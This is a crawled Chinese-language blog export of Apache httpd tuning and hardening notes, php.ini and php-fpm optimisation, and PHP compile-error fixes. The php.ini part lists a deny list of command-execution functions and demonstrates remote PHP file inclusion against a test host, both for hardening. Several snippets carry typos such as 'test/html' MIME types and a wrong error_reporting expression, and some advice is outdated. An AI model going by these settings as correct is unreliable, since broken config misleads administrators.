start # MaxConnectionsPerChild: maximum number of connections a server process serves # before terminating \u0026lt;IfModule mpm_prefork_module\u0026gt; StartServers 1 #\u0026lt;==最初建立的子进程 MinSpareServers 1\t#\u0026lt;==最小空闲进程数，如果空闲进程小于设定值，apache会自动建立进程，如果服务器并发及负载大的话，可以考虑加大。 MaxSpareServers 2\t#\u0026lt;==最大空闲进程，如果空闲的进程大于设定值，apache会自动kill掉多余的进程，如果服务器负载大的话，可以考虑加大 MaxRequestWorkers 20\t#\u0026lt;==设定apache可以同时处理的请求，是对apache性能影响最大的参数，就是apache可以同时处理的请求数，就是说，如果有150个用户在访问，那么第151个用户就要等之前的访问结束后才能访问 MaxConnectionsPerChild 0\t#\u0026lt;==每个子进程可处理的请求数。每个子进程在处理了[max requests perchild] 个请求后将自动销毁。0意味着无限，即子进程永不销毁，虽然缺省值为0,可以使每个子进程处理更多的请求，但如果设成非0值也有两点重要好处1.可防止意外的内存泄露2.在服务器负载下降的时候会自动减少子进程数 \u0026lt;/IfModule\u0026gt; worker模式 worker模式是 Apache2.X 新引进来的模式，是线程与进程的结合，在worker模式下会有多个子进程，每个进程又会有多个线程。每个线程在某个确定的时间只能维持一个连接。\n工作原理\n由主控制进程生成若干个子进程，而每个子进程中又包含固定的线程数，各个线程独立处理请求，同样为了不在请求到来时再生成线程，再配置文件中设置了最小和最大的空闲线程数及所有子进程中的线程总数，如果现有子进程中的线程总数不能满足并发及负载，控制进程将派生新的子进程。\n在配置编译的过程中，加入参数 --with-mpm-worker，如果不加的话系统会采用默认prefork模式。\n优点：内存占用比prefork模式低，适合高并发高流量HTTP服务。 缺点：假如一个线程崩溃，整个进程就会连同其任何线程一起 “死掉”。由于线程贡献内存空间，所以一个程序在运行时必须被系统识别为“每个线程都是安全的”服务稳定性不如prefork模式。 worker 模式配置参数说明 # worker MPM # StartServers: initial number of server processes to start # MinSpareThreads: minimum number of worker threads which are kept spare # MaxSpareThreads: maximum number of worker threads which are kept spare # ThreadsPerChild: constant number of worker threads in each server process # MaxRequestWorkers: maximum number of worker threads # MaxConnectionsPerChild: maximum number of connections a server process serves # before terminating \u0026lt;IfModule mpm_worker_module\u0026gt; StartServers 3\t#\u0026lt;==最初建立的子进程 MinSpareThreads 75\t#\u0026lt;==最小空闲线程数，如果空闲的线程小于设定值，apache会自动建立线程，如果服务器负载大的话，可以考虑加大此参数值。 MaxClients #\u0026lt;==所有子进程中的线程总数。如果现有子进程中的线程总数不能满足负载，控制进程将派生新的子进程。 MaxSpareThreads 250 #\u0026lt;==最大空闲线程数，如果空闲的线程大于设定值，apache会自动kill掉多余的线程，如果服务器负载过大的话，可以考虑加大此参数值。 ThreadsPerChild 25\t#\u0026lt;==每个进程包含固定的线程数，此参数再worker模式中，是影响最大的参数 MaxRequestWorkers 400\tMaxConnectionsPerChild 0Threads \u0026lt;/IfModule\u0026gt; worker模式下所能同时处理的请求总数是由子进程总数乘Threadsperchild值决定的，应该大于等于maxcliens。如果负载很大，现有的子进程数不能满足时，控制进程会派生新的子进程。\n默认最大的子进程总数是16，如需加大时，也需要显式声明serverlimit的值（最大值是20000）\n特别说明\n如果显式生命了serverLimit，那么它乘 ThreadPreChild 的值必须大于等于MaxClients,而且MaxClients必须是ThreadPerChild的整数倍，否则Apache将会自动调节Apache将会自动调节到一个相应的值（可能是个非常期望值）\n通过数学表达\nMaxClient \u0026lt;= 总的进程（ServerLimit）* 线程数（ThreadsPerChild）、\nMaxClient % ThreadsPerChild = 0\n注意：worker MPM也有不完善的地方，如果一个线程崩溃，整个进程就会连同其所有线程一起 “死掉”\n配置httpd对站点文件压缩 mod_deflate模块介绍 Apache的 mod_deflate 模块提供了 Deflate 输出过滤器，允许httpd服务器将输出内容在发送到客户端之前根据具体的策略进行压缩，以节约网络带宽，同时提升用户访问体验。\nmod_deflate 模块安装方法\n检查是否安装了模块 mod_deflate\n$ /app/apache/bin/apachectl -l Compiled in modules: core.c mod_so.c http_core.c prefork.c 常规方法安装 --enable-deflate 提供对内容的亚索传输编码支持，一般html js css等内容站点，使用此参数功能会大大提高传输速度，提升访问者访问体验。在生产环境中，这是 httpd 调优的一个重要选项之一。\nmod_deflate DSO安装方法 以DSO动态模块加载mod_deflate配置的全部命令为\ncd /root/tools/httpd-2.4.18/modules/filters\t#\u0026lt;==切换到apache软件目录mod_deflate程序下 /app/apache/bin/apxs -c -i -a mod_deflate.c #\u0026lt;==以dso的方式编译入到apache中 出现如下错误\nhttpd: Syntax error on line 103 of /app/apache2.4/conf/httpd.conf: Cannot load modules/mod_deflate.so into server: /app/apache2.4/modules/mod_deflate.so: undefined symbol: inflateEnd 解决方法：\n出现这个错误其实时因为 mod_deflate 模块没有找到 zlib 库。解决办法就是找到 apr-config 文件中的LDFLAGS=\u0026quot;\u0026quot;，把他改成 LDFLAGS=\u0026quot;-lz\u0026quot; ，然后在运行 /usr/local/apache2/bin/apxs -i -c -a mod_deflate.c 一般就可以了。\n方法1：在apr的主配置文件 apr-1-config（老版本可能是apr-conf）里面将 LDFLAGS=\u0026quot;\u0026quot; 修改为 LDFLAGS=\u0026quot;-lz\u0026quot;，然后用 apxs 从新编译 mod_deflate.c 后，httpd 服务就正常了，并且也可以正常压缩文件了。\n方法2：需要在 LoadModule deflate_module modules/mod_deflate.so 的前面加载 zlib.so64 操作系统就在 LoadModule deflate_module modules/mod_deflate.so 这行的上一行添加 LoadFile /usr/lib64/libz.so即可。\n上述参数选项说明\n参数 说明 -c 需要执行编译操作。他首先会编译C源码程序(.c)files为对应的目标代码文件(.o)，然后连接这些目标代码和files中其余的目标代码文件(.o和.a)，以生成动态共享对象dsofile。如果没有指定-o选项，则此输出文件名由files中的第一个文件名推测得到，也就是默认为mod_name.so -i 需要执行安装操作，以安装一个或多个共享对象到服务器的modules目录中。 -a 增加一个LoadMoudule行到httpd.conf文件中，以激活此模块 mod_deflate测试 mod_deflate模块可以在主配置文件中配置，也可以在虚拟主机中配置\n在主http.conf配置中配置如下：\n\u0026lt;ifmodule mod_deflate.c\u0026gt; # \u0026lt;==开始标签标记 判断模块是否开启 DeflateCompressionLevel 6 # \u0026lt;==压缩级别 1-9 SetOutputFilter DEFLATE\t# \u0026lt;==启用deflate模块对本站点的所有输出进行GZIP压缩 AddOutputFilterByType Deflate text/html test/pain text/xml text/css AddOutputFilterByType Deflate application/javascript \u0026lt;/ifmodule\u0026gt; # \u0026lt;==判断结束标记 mod_expires 缓存功能 mod_expires允许通过apache配置文件控制 HTTP “Expires:” 和 “Cache-Control:” 头内容，这个模块控制服务器应答时的Expires头内容和Cache-Control头的max-age指令。有效期可以设置为相对于源文件的最后修改时刻或者客户端的访问时刻。\n这些HTTP头向客户端表明了内容的有效性和持久性。如果客户端本地有缓存，则内容就可以从缓存（除非过期）而不是从服务器读取。人后客户端会检查缓存中的副本，看看是否过期或者失效，以决定是否重新从服务器获得内容更新。\n常规方法安装 \u0026ndash;enable-deflate\n提供对内容的亚索传输编码支持，一般html js css等内容站点，使用此参数功能会大大提高传输速度，提升访问者访问体验。在生产环境中，这是Apache调优的一个重要选项之一。\n以DSO动态模块加载mod_deflate配置的全部命令为：\ncd /root/tools/httpd-2.4.18/modules/metadata#\u0026lt;==切换到apache软件目录mod_expires程序下 /app/apache/bin/apxs -c -i -a mod_expires.c #\u0026lt;==以dso的方式编译入到apache中 mod_expires在httpd中应用 在主配置文件中配置，所有的虚拟主机都生效，在对应的虚拟主机上配置，只有对应的虚拟主机生效\n\u0026lt;ifmodule expires_module\u0026gt; ExpiresActive on ExpiresDefault \u0026quot;access plus 12 months\u0026quot; ExpiresByType test/html \u0026quot;access plus 1 years\u0026quot; ExpiresByType test/css \u0026quot;access plus 1 years\u0026quot; ExpiresByType test/xml \u0026quot;access plus 1 years\u0026quot; ExpiresByType test/php \u0026quot;access plus 1 years\u0026quot; ExpiresByType image/gif \u0026quot;access plus 30 days\u0026quot; #ExpiresByType image/jpeg \u0026quot;access plus 30 days\u0026quot; #ExpiresByType image/jpg \u0026quot;access plus 30 days\u0026quot; ExpiresByType image/jpeg A7200000 ExpiresByType image/png \u0026quot;access plus 30 days\u0026quot; ExpiresByType application/javascript \u0026quot;access plus 30 days\u0026quot; ExpiresByType application/x-javascript \u0026quot;access plus 30 days\u0026quot; ExpiresByType image/png \u0026quot;access plus 30 days\u0026quot; \u0026lt;/ifmodule\u0026gt; 配置httpd防盗链功能 httpd Web服务实现防盗链 利用referer和rewrite实现Apache防盗链调用，在主配置文件 httpd.conf 或者在虚拟主机 httpd-vhosts.conf 中配置如下\nRewriteEngine ON\tRewriteCond %{HTTP_REFERER} !^http://www.test.com/.*$ [NC] #\u0026lt;==此处，如果加http://就必须加^,否则直接写servername即可 如下 RewriteCond %{HTTP_REFERER} !http://www.test.com [NC] RewriteCond %{HTTP_REFERER} !^http://www.test.com$ [NC] RewriteCond %{SCRIPT_FILENAME} !nolink.png [NC]#\u0026lt;==为防止无限302，文件名如果为nolink.png即不重写 RewriteRule .*\\.(gif|jpg|swf|png)$ img/nolink.png [R,NC,L] #\u0026lt;==重写时，必须加R 访问查看结果\n用原本的域名访问，可直接访问\nhttpd常用Rewrite标志 flag 说明 Chain|C 如果当前规则被匹配，则继续处理其后继规则，如果当前规则不被匹配， 则其后继规则将被跳过。 forbidden|F 强制禁止当前URL的响应，并向客户端发送一个403的HTTP响应代码。 gone|G 强制废弃当前URL,向客户端发送一个410的HTTP响应代码，来表明此URL是已被废弃的。 handler|H=Content-handler 为需要处理的目标文件强制指定一个内容处理器。 last|L 停止标志，当mod_rewrite模块处理到此标志时会停止重写搡作，并不再应用其他重写规则。此标志通常用于跳出规则处理。 next|N 循环重写规则，从第一个规则开始再次执行重写规则，但此时处理的URL己经不是原始的URL.它相当于Perl语言中的next命令。 nocase|NC 忽略Pattern中的大小写。 Noescape|NE 使用此标记可以让URL中允许使用一些特殊字符，例如，‘T’、‘%’、‘;’等，如果不使用此标记则是将这些特殊字符转换成等值的16进制编码如‘%25’、‘%24’、‘%3B’等。 nosubreq|NS 不对内部子请求进行处理，使用此标记如果是内部子请求，则跳过当前规则。通常使用CGI脚本的子请求会出现一些问题，因此可以使用些标记来 禁止子请求。 proxy|P 强制重写的URL在内部由代理服务器模块来处理，并中断重写过程。使用这个标记要注意的是需要保证代理模块已经被加载，同时替换的字串是一个能被代理模块处理的有效的URL,否则代理模块将会返回一个错误的信息。 Passthiough|PT 将此URL强制交给下一个处理器来进行处理，而在转交之前， mod_rewrite模块会将内部request_rec结构中的URL字段设置为filename字段的值，这使得RewriteRule指令的输出能够被（从URL转换到文件名的）Alias、 ScriptAlias、Redirect等指令进行后续处理。 Qsappend|QSA 你可以通过此标记在现有的替换字符串中增加一个査询字符串， 注意：是增加而不是替换。 将重写的URL作为一个重定向处理，在使用这个标记时，必须确保该替换字段是一个有效的URL。否则，它会指向一个无效的位置，并且此 标记本身只是对URL加上http://thishost[:thisport]/前缀。如果没有在此标记后面指 定HTTP响应代码则会使用302 (临时性移动）这个响应代码来进行处理。用户可指定的响应代码范围为300〜400,或是使用符号化的名称，例如，temp、seeother 等。 redirect|R[=code] 将重写的URL作为一个重定向处理，在使用这个标记时，必须确保该替换字段是一个有效的URL。否则，它会指向一个无效的位置，并且此 标记本身只是对URL加上 http://thishost[:thisport]/ 前缀。如果没有在此标记后面指 定HTTP响应代码则会使用302 (临时性移动）这个响应代码来进行处理。用户可指定的响应代码范围为300〜400,或是使用符号化的名称，例如，temp、seeother 等。 skip|S=num 与chain|C标记不同，使用此标记将强制跳过后继的规则，用户可以通过此标记来模拟if-then-else结构，最后一个规则是then从句，而被跳过的skip=N 个规则是else从句。 type|T=MIME-type 强制目标文件的MIME类型为MIME-type所指定的类型。 禁止资源目录解析PHP程序 方案1：提示下载不解析\n\u0026lt;Directory \u0026quot;/app/apache-2.4.18/htdocs/php\u0026quot;\u0026gt; AllowOverride None Options None Require all granted php_admin_flag engine off #\u0026lt;==禁止解析php文件，此参数必须apex方式安装才存在。反之报错 \u0026lt;/Directory\u0026gt; php_admin_flag engine off 这个语句就是禁止解析 php 的控制语句，但只这样配置还不够，因为这样配置后用户依然可以访问 php 文件，只不过不解析了，但可以下载，用户下载 php 文件也是不合适的，所以有必要再禁止一下。\n禁止目录索引浏览功能 默认配置当网站没有首页文件时，httpd会把整个目录结构展示给网站用户，这是非常大的隐患，必须要屏蔽掉。\n在主配置文件 httpd.conf 或者虚拟主机的配置文件 httpd-vhost.conf 文件配置如下内容即可\n\u0026lt;Directory \u0026quot;/app/apache-2.4.18/htdocs\u0026quot;\u0026gt; Options FollowSymLinks AllowOverride None Require all granted Allow from all \u0026lt;/Directory\u0026gt; 或\n\u0026lt;Directory \u0026quot;/app/apache-2.4.18/htdocs\u0026quot;\u0026gt; Options -Indexes FollowSymLinks AllowOverride None Require all granted Allow from all \u0026lt;/Directory\u0026gt; 更改之后出现403权限问题，说明禁止了目录索引功能\n关闭无用的CGI功能配置 304 \u0026lt;IfModule alias_module\u0026gt; 305 # 306 # Redirect: Allows you to tell clients about documents that used to 307 # exist in your server's namespace, but do not anymore. The client 308 # will make a new request for the document at its new location. 309 # Example: 310 # Redirect permanent /foo http://www.example.com/bar 311 312 # 313 # Alias: Maps web paths into filesystem paths and is used to 314 # access content that does not live under the DocumentRoot. 315 # Example: 316 # Alias /webpath /full/filesystem/path 317 # 318 # If you include a trailing / on /webpath then the server will 319 # require it to be present in the URL. You will also likely 320 # need to provide a \u0026lt;Directory\u0026gt; section to allow access to 321 # the filesystem path. 322 323 # 324 # ScriptAlias: This controls which directories contain server scripts. 325 # ScriptAliases are essentially the same as Aliases, except that 326 # documents in the target directory are treated as applications and 327 # run by the server when requested rather than as documents sent to the 328 # client. The same rules about trailing \u0026quot;/\u0026quot; apply to ScriptAlias 329 # directives as to Alias. 330 # 331 ScriptAlias /cgi-bin/ \u0026quot;/app/apache-2.4.18/cgi-bin/\u0026quot; 332 333 \u0026lt;/IfModule\u0026gt; \u0026lt;Directory \u0026quot;/app/apache-2.4.18/htdocs/bbs\u0026quot;\u0026gt; Options FollowSymLinks AllowOverride None Order allow,deny Allow form all \u0026lt;/Directory\u0026gt; 禁止httpd用户重载功能 \u0026lt;Directory \u0026quot;/app/apache-2.4.18/htdocs\u0026quot;\u0026gt; Options -Indexes FollowSymLinks AllowOverride None\t#\u0026lt;==禁止用户重载 Require all granted Allow from all \u0026lt;/Directory\u0026gt; 禁止用户重载会加快服务器响应速度，因为它不在为每个请求寻找每个目录访问控制文件(.htaccess)。也杜绝了开发人员变相修改配置的安全隐患\n避免使用.htaccess文件 在Apache中，AllowOvCTride 指令来设置是否启用 .htaccess 文件功能。但是对于一些管理员来说，更简单更精细化的控制目录可以为他们节省很多的时间，于是 .htaccess 文件提供了一个这样的功能，你可以使用默认AllowOverride指令是使用None参数来禁止使用.htaccess文件功能。\n可使用参数：\n* All：使用所有能在.htaccess文件中使用的指令. * AuthConfig：使用鉴权指令，例如，AuthName、AuthType 等. * FileInfo：使用控制文件类型的指令，例如，ErrorDocument、SetOutputFilter等. * Indexes:使用目录索引指令. * Options：使用控制目录功能指令. * Limit：使用主机访问控制指令. 注意：\n.htaccess 文件会导致服务器性能的急速（如果服务器上有很多目录，且每层目录下都有.haccess文件）下降，在使用了AllowOverride指令允许使用 .htaccess 文件后，无论是否使用 .htaccess 文件，httpd都会在每个目录下查找 .htaccess 文件。其次，当每个请求链接到来时，httpd 会查找链接所请求目录下的 .htaccess 文件，并且再査找它的上级目录中的 .htaccess 文件以使 .htaccess 文件内的设置都能生效。这些査找会让httpd 性能降低很多。另外还有安全方面的问题，.htaccess 文件可以修改和覆盖服务器的指令，因此会产生一些未被限制的修改，而这些修改将会导致一些安全问题的出现。\n如何对httpd配置优化？ 配置软件软件轮训Apache访问日志 优化访问日志记录的信息 配置HTTP错误页面优雅显示 配置 httpd 对站点文件压缩 Mod_Expires缓存功能 更改 httpd 默认用户 调整 httpd 的工作模式 屏蔽 httpd 对外显示的版本等敏感信息 屏蔽 httpd 对外显示的版本等敏感信息 最小化 httpd 目录及文件权限设置 最小化 httpd 日志目录权限 加大 httpd 并发连接数 配置 httpd 防盗链功能 禁止 httpd 目录索引浏览功能 禁止 httpd 用户重载功能 避免使用.htaccess文件 关闭无用的CGI功能配置 禁止资源目录解析PHP程序 使用TMPFS文件系统替代频繁访问的目录 尽可能减少HTTP请求 使用CDN左网站加速 httpd 程序架构优化 httpd 的安全模块 正确途径取得源代码，勤打 httpd 补丁 系统内核参数优化 配置Mod_Pagespeed优化Web性能 防止用户请求跳出Web站点目录 ","permalink":"https://www.oomkill.com/2016/10/apache-httpd/","summary":"","title":"Apache httpd配置集锦"},{"content":"PHP引擎缓存优化加速 eaccelerator zend opcode xcache 使用tmpfs作为缓存加速缓存的文件目录 mount -t tmpfs tmpfs /dev/shm -o size=256m mount -t tmpfs /dev/shm/ /tmp/eaccelerator/ 利用好tmpfs\n1.上传目录缩略图临时处理目录/tmp.\n2.其他加速器临时目录/tmp/eaccelerator/\nphp.ini参数优化 无论是 apache 还是 nginx，php.ini都是适合的。而 php-fpm.conf 适合nginx。而php-fpm.conf更适合 nginx+fcgi 的配置。首选选择产品环境的 php.ini\n开发场景：development 生产环境：production 打开php的安全模式 php的安全模式是个非常重要的php内嵌的安全机制，能够控制一些php中的函数执行，比如system() ,同时把很多文件操作的函数进行了权限控制。php5.4后弃用\n该参数配置如下：\n336 ; Safe Mode 337 ; http://php.net/safe-mode 338 safe_mode = Off 用户和安全组 当safe_mode打开时，safe_mode_gid被关闭，那么php脚本能够对文件进行访问，而且相同组的用户也能够对文件进行访问。建议设置为safe_mode_gid=off;\n如果不进行设置，可能我们无法对我们服务器网站目录下的文件进行操作了，比如我们需要对文件进行操作的时候。php5.3默认为 safe_mode_gid=off; （新版弃用）\n关闭危险函数 如果打开了安全模式，那么函数禁止是可以不需要的，但是我们为了安全还是考虑进去。比如，我们觉得不希望执行包括 system() 等在那的能够执行命令的php函数，或者能够查看php信息的 phpinfo() 等函数，那么我们就可以禁止他们，方法如下：\ndisable_functions = system,passthru,exec,shell_exec,popen,phpinfo 如果你要禁止任何文件和目录的操作，那么可以关闭很多文件操作。\ndisable_functions = chdir,chroot,getcwd,opendir,readdir,scandir,fopen,unlink,delete,copy,mkdir,rmdir,rename,file,file_get_contents,fputs,fwrite,chgrp,chmod,chown 以上只列出部分不叫常用的文件处理函数，你也可以把上面执行命令函数和这个函数结合，就能够地址大部分的phpshell了。该参数默认为 disable_functions=.\n关闭PHP版本信息在http头中的泄露 为了防止黑客获取服务器中php版本信息，可以关闭该信息泄露在http头中，该参数默认如下：\n# 在http头中加上其签名，不会有安全上直接威胁，但使客户端知道PHP版本 expose_php = On # 建议设置为Off expose_php = Off 建议设置为Off，这样当黑客抓取头信息时，无法看到PHP的信息。\n关闭注册全局变量 在PHP中提交的变量，包括使用POST或者GET提交的变量，都将自动注册为全局变量，能够直接访问，这是对服务器非常不安全的，所以我们不能让它注册为全局变量，就把注册全局变量选项关闭（5.4弃用）\nregister_globals = Off 打开magic_quotes_gpc来防止SQL注入 SQL注入是非常危险的问题，轻则网站后台被入侵，重则整个服务器沦陷，php.ini 有一个设置，5.4已移除\n错误信息控制 一般php在没有连接到数据库或者其他情况下会有提示错误，一般错误信息会包含php脚本当前距离信息或者查询的SQL语句等信息，这类信息提供给黑客后，是不安全的，所以一般服务器建议禁止错误提示\ndisplay_errors = Off ; 是否将错误信息作为输出的一部分显示给终端用户。应用调试时，可以打开，方便查看错误. ; 在最终发布的web站点上，强烈建议你关掉这个特性，并使用错误日志代替（参看下面）. ; 在最终发布的web站点打开这个特性可能暴露一些安全信息. ; 例如你的web服务器上的文件路径、数据库规划或别的信息. 设置为\ndisplay = Off # (php 5.3+默认即为Off) 如果你确实要显示错误信息，一定要设置显示错误级别，比如只显示警告以上的信息，当然最好是关闭错误提示\nerror_reporting = E_WARNING \u0026amp; E_ERROR 错误日志 建议在关闭display_errors后能够把错误信息记录下来，便于查找服务器运行的原因：\nlog_errors = On 同时也要设置错误日志存放的目录，建议和Web日志存放在一起.\n# 文件必须允许web用户和组具有写权限 error_log = /app/logs/php_errors.log 部分资源限制参数优化 设置每个脚本运行的最长时间 当无法上传较大的文件或者后台备份数据经常超时，此时需要调整如下设置：\nmax_execution_time = 30 ; 每个脚本允许最大执行时间（秒），0表示没有限制. ; 这个参数有助于组织劣质脚本无休止占用服务器资源. ; 该指令仅影响脚本本身的运行时间，任何其它华为在脚本运行之外的时间. ; 如用system()/sleep()函数的使用、数据库查询、文件上传等，都不包括在内. ; 在安全模式下，你不能用ini_set()在运行时改变这个位置. 每个脚本使用的最大内存 memory_limit = 128M ; 一个脚本能够申请到的最大内存字节数（可以使用K和M作为单位）. ; 这有助于防止劣质脚本消耗完服务器上所有内存. ; 要能够使用该指令碧玺在编译时使用“--enable-memory-limit”配置选项. ; 如果要取消内存限制，则必须将其设为-1. ; 设置了该指令后，memory_get_usage()函数变为可用. 每个脚本等待输入数据最长时间 max_input_time = -1 ; 每个脚本解析输入数据（POST,GET,upload）的最大允许时间（秒） ; -1 表示不限制 http://php.net/max-input-time\n设置为\nmax_input_time = 60 上载文件的最大许可大小 当上传较大文件时，需要调整如下参数：\n; 上载文件的最大许可大小 upload_max_filesize = 2M 详情：http://php.net/upload-max-filesize\n部分安全参数优化 禁止打开远程地址 记得最近出的 php include 的那个漏洞吗？就是在一个php程序中include变量，那么入侵者就可以利用这个控制服务器在本地执行远程的一个php程序，例如phpshell，所以我们关闭这个。\n; Whether to allow the treatment of URLs (like http:// or ftp://) as files. allow_url_fopen = On 详情：http://php.net/allow-url-fopen\n测试远程allow_url_include www.remote.com/1.php：\n\u0026lt;?php $arr = array(1,2,3,4,5); ?\u0026gt; www.httpd.com/1.php：\n\u0026lt;?php include('http://www.remote.com:81/1.php'); var_dump($arr); ?\u0026gt; 运行结果\n测试远程allow_url_fopen 本地读取远端文件的脚本文件内容如下：\n\u0026lt;?php $file = fopen('http://www.remote.com:81/1.php', 'r');\t// 读取远程文件 $i=1; //初始化行号 while( !feof($file) ){ $row = fgets($file);\t//读取一行 echo $i . '--' . $row;\t//输出 $i++; } fclose($file); ?\u0026gt; 执行脚本结果如下：\n$ /app/php/bin/php 2.php 1--\u0026lt;?php 2--$arr = array(1,2,3,4,5); 3--?\u0026gt; 当在禁止后，再重新运行以上脚本文件会报如下错误\nWarning: include() [[function.include](http://www.httpd.com/function.include)]: http:// wrapper is disabled in the server configuration by allow_url_fopen=0 Warning: fopen() [[function.fopen](http://www.httpd.com/function.fopen)]: http:// wrapper is disabled in the server configuration by allow_url_fopen=0 调整php session信息存放类型和位置 ; 存储和检索会话关联的数据的处理器名字。默认为文件“file” ; 如果想要使用自定义的处理器（如基于数据库的处理器），可用“user” ; 设为\u0026quot;memcache\u0026quot;则可以使用memcache作为会话处理器（需要指定\u0026quot;--enable-memcache-session\u0026quot;编译选项）。 session.save_handler = files ; 传递给处理器的参数。对于files处理器，此值是创建会出数据文件的路径。 session.save_path = \u0026quot;/tmp\u0026quot; web集群session贡献存储设置，默认php.ini中session的类型和配置路径：\nsession.save_handler = \u0026quot;tcp://192.168.2.8:11211\u0026quot; PHP-FPM参数优化 如果你的高负载网站使用PHP-FPM管理FastCGI，也许下面这些技巧对你有用\n尽量少安装PHP模块，最简单是最好（快）的\n把你的PHP FastCGI子进程数调到100或以上，在4G内存的服务器上200就可以（建议压力测试来得出自己服务器合理的值）\nsocket连接FastCGI，/dev/shm是内存文件系统，socket放在内存中肯定会快些\nLinux下增加文件打开数，命令如下：\n; 增加 PHP-FPM 打开文件描述符的限制，此参数和php-fpm进程数有关 rlimit_files = 51200 使用php代码加速器，例如 eAccelerator, XCache.在Linux平台上可以把 cache_dir 指向 /dev/shm\nphp-fpm.conf重要优化参数详解：\npm = dynamic ; pm参数指定了进程管理方式，有两种可供选择：static或dynamic，从字面意思不难理解，为静态或动态方式。如果是静态方式，那么在php-fpm启动的时候就创建了指定数目的进程，在运行过程中不会再有变化(并不是真的就永远不变)；而动态的则在运行过程中动态调整，当然并不是无限制的创建新进程，受pm.max_spare_servers参数影响；动态适合小内存机器，灵活分配进程，省内存。静态适用于大内存机器，动态创建回收进程对服务器资源也是一种消耗 pm.max_children = 24 ; static模式下创建的子进程数或dynamic模式下同一时刻允许最大的php-fpm子进程数量 pm.start_servers = 16 ; 动态方式下的起始php-fpm进程数量 pm.min_spare_servers = 12 ; 动态方式下服务器空闲时最小php-fpm进程数量 pm.max_spare_servers = 24 ; 动态方式下服务器空闲时最大php-fpm进程数量 log_level = error ; 错误级别. 可用级别为: alert（必须立即处理）, error（错误情况）, warning（警告情况）, notice ;（一般重要信息）, debug（调试信息）. 默认: notice. error_log = /app/run/log/php-fpm.log ; 错误日志，默认在安装目录中的var/log/php-fpm.log pid = /app/run/php/php-fpm #\u0026lt;==一般规划好目录与mysql nginx等在同目录下，方便管理 ; pid设置，默认在安装目录中的var/run/php-fpm.pid，建议开启 emergency_restart_threshold = 0 emergency_restart_interval = 0 ; 表示在emergency_restart_interval所设值内出现SIGSEGV或者SIGBUS错误的php-cgi进程数如 ; 果超过 emergency_restart_threshold个，php-fpm就会优雅重启。这两个选项一般保持默认值。 process_control_timeout = 0 ; 设置子进程接受主进程复用信号的超时时间. 可用单位: s(秒), m(分), h(小时), 或者 d(天) 默认单位: s(秒). 默认值: 0. daemonize = yes ; 后台执行fpm,默认值为yes，如果为了调试可以改为no。在FPM中，可以使用不同的设置来运行多个进程池。 这些设置可以针对每个进程池单独设置. listen = 127.0.0.1:9000 ; fpm监听端口，即nginx中php处理的地址，一般默认值即可。可用格式为: 'ip:port', 'port', '/path/to/unix/socket'. 每个进程池都需要设置. listen.backlog = -1 ; backlog数，-1表示无限制，由操作系统决定，此行注释掉就行。backlog含义参考http://www.3gyou.cc/?p=41 listen.allowed_clients = 127.0.0.1 ; 允许访问FastCGI进程的IP，设置any为不限制IP，如果要设置其他主机的nginx也能访问这台FPM进程，listen处要设置成本地可被访问的IP。默认值是any。每个地址是用逗号分隔. 如果没有设置或者为空，则允许任何服务器请求连接 listen.owner = www listen.group = www listen.mode = 0666 ; unix socket设置选项，如果使用tcp方式访问，这里注释即可。 user = www group = www ; 启动进程的帐户和组 pm.max_requests = 1000 ; 设置每个子进程重生之前服务的请求数. 对于可能存在内存泄漏的第三方模块来说是非常有用的. 如果设置为 '0' 则一直接受请求. 等同于 PHP_FCGI_MAX_REQUESTS 环境变量. 默认值: 0. pm.status_path = /status ; FPM状态页面的网址. 如果没有设置, 则无法访问状态页面. 默认值: none. munin监控会使用到 ping.path = /ping ; FPM监控页面的ping网址. 如果没有设置, 则无法访问ping页面. 该页面用于外部检测FPM是否存活并且可以响应请求. 请注意必须以斜线开头 (/)。 ping.response = pong ; 用于定义ping请求的返回相应. 返回为 HTTP 200 的 text/plain 格式文本. 默认值: pong. request_terminate_timeout = 0 ; 设置单个请求的超时中止时间. 该选项可能会对php.ini设置中的'max_execution_time'因为某些特殊原因没有中止运行的脚本有用. 设置为 '0' 表示 'Off'.当经常出现502错误时可以尝试更改此选项。 request_slowlog_timeout = 10s ; 当一个请求该设置的超时时间后，就会将对应的PHP调用堆栈信息完整写入到慢日志中. 设置为 '0' 表示 'Off' slowlog = log/$pool.log.slow ; 慢请求的记录日志,配合request_slowlog_timeout使用 rlimit_files = 1024 ; 设置文件打开描述符的rlimit限制. 默认值: 系统定义值默认可打开句柄是1024，可使用 ulimit -n查看，ulimit -n 2048修改。 一般 php-fpm 进程占用20~30m左右的内存就按 30m 算。如果单独跑 php-fpm，动态方式起始值可设置物理内存 $\\frac{Mem}{30M}$，由于大家一般Nginx, MySQL都在一台机器上，于是预留一半给它们，即php-fpm进程数为 $\\frac{mem}{2\\times30M}$。\n参考文章：\nhttps://jingyan.baidu.com/article/fdbd4277c4dacbb89f3f4855.html\nhttp://www.cnblogs.com/argb/p/3604340.html\n","permalink":"https://www.oomkill.com/2016/10/php-ini/","summary":"","title":"php.ini优化"},{"content":"编译错误 错误：同时指定了fpm与aspxs2方式错误 You've configured multiple SAPIs to be build.You can build only one SAPI module and CLI binary at the same time 原因：导致的原因是我的配置参数中同时使用了\u0026ndash;enable-fpm 与\u0026ndash;with-apxs2，因此编译的时候出错了，去掉其中的任意一个参数编译成功。\n系统缺少libtool make ***[libphp5.la] Error 1 解决方法：在编译PHP版本时，产生错误 make ***[libphp5.la] Error 1\n错误原因：系统缺少libtool\n解决办法：yum install libtool-ltdl-devel\nmake过程错误 make: *** [sapi/cli/php] Error 1 原因：在 「./configure 」 沒抓好一些环境变数值。错误发生点在建立「-o sapi/cli/php」是出错，没給到要 link 的 iconv 库参数。\n报错提示：\nlibiconv.so.2: cannot open shared object file: No such file or directory mak /root/tools/php-7.1.3/ext/iconv/iconv.c:2591: undefined reference to `libiconv_open' ext/xmlrpc/libxmlrpc/.libs/encodings.o: In function `convert': /root/tools/php-7.1.3/ext/xmlrpc/libxmlrpc/encodings.c:74: undefined reference to `libiconv_open' /root/tools/php-7.1.3/ext/xmlrpc/libxmlrpc/encodings.c:82: undefined reference to `libiconv' /root/tools/php-7.1.3/ext/xmlrpc/libxmlrpc/encodings.c:102: undefined reference to `libiconv_close' collect2: ld returned 1 exit status make: *** [sapi/cli/php] Error 1 解决方法1：编辑Makefile 我的php7.1.3在88行的地方:在最后加上 -liconv，或者编译时，编译参数指定 iconv 安装目录不会报此错误。\n113 EXTRA_LIBS = -lcrypt -lz -lexslt -lcrypt -lrt -lmcrypt -lpng -lz -ljpeg -lcurl -lz -lrt -lm -ldl -lnsl -lrt -lxml2 -l z -lm -lgssapi_krb5 -lkrb5 -lk5crypto -lcom_err -lssl -lcrypto -lcurl 